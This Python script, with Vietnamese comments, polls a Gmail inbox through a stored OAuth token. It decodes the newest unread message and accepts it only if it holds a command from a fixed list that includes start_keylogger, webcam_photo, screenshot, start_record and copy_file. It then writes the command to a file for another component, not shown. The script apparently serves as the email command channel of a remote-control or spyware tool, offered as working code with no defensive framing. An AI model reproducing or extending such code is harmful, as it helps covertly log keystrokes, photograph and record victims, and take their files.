from __future__ import print_function
import os.path
import pickle
import base64
import re
from googleapiclient.discovery import build

VALID_COMMANDS = [
    "help", "list_services", "list_apps", "start_keylogger", "stop_keylogger",
    "screenshot", "webcam_photo", "restart", "shutdown", "start_record", "stop_record",
    "start ", "stop ", "copy_file"
]

def contains_valid_command(text):
    for cmd in VALID_COMMANDS:
        if text.startswith(cmd) or f"\n{cmd}" in text:
            return True
    return False

def get_latest_message():
    creds = None
    script_dir = os.path.dirname(os.path.abspath(__file__))
    token_path = os.path.join(script_dir, "token.pickle")
    if os.path.exists(token_path):
        with open(token_path, "rb") as token:
            creds = pickle.load(token)
    else:
        print("Missing token.pickle")
        return

    if not creds or not creds.valid:
        print("Credentials invalid.")
        return

    try:
        service = build("gmail", "v1", credentials=creds)
        results = service.users().messages().list(
            userId="me",
            maxResults=1,
            labelIds=["INBOX", "UNREAD", "CATEGORY_PERSONAL"]
        ).execute()

        messages = results.get("messages", [])

        if not messages:
            print("No unread messages.")
            return

        msg_id = messages[0]["id"] 
        msg = service.users().messages().get(userId="me", id=msg_id, format="full").execute()
        payload = msg.get("payload", {})

        # Decode body content
        body_data = ""
        if "data" in payload.get("body", {}):
            body_data = payload["body"]["data"]
        elif "parts" in payload:
            for part in payload["parts"]:
                if part.get("mimeType") == "text/plain" and "data" in part.get("body", {}):
                    body_data = part["body"]["data"]
                    break

        if not body_data:
            print("No readable content in email.")
            return

        decoded_str = base64.urlsafe_b64decode(body_data).decode("utf-8").strip()
        print("Email content:", decoded_str)

        if not contains_valid_command(decoded_str):
            print("Email does not contain a valid command. Ignored.")
            return  # không đánh dấu đã đọc

        # đánh dấu là đã đọc sau khi đã lấy nội dung
        service.users().messages().modify(userId='me', id=msg_id, body={'removeLabelIds': ['UNREAD']}).execute()

        # Ghi ra file nếu hợp lệ
        output_path = os.path.join(script_dir, "last_command.txt")
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(decoded_str)

        print("Email processed and marked as read.")

    except Exception as e:
        print("Error reading email:", str(e))


if __name__ == "__main__":
    get_latest_message()
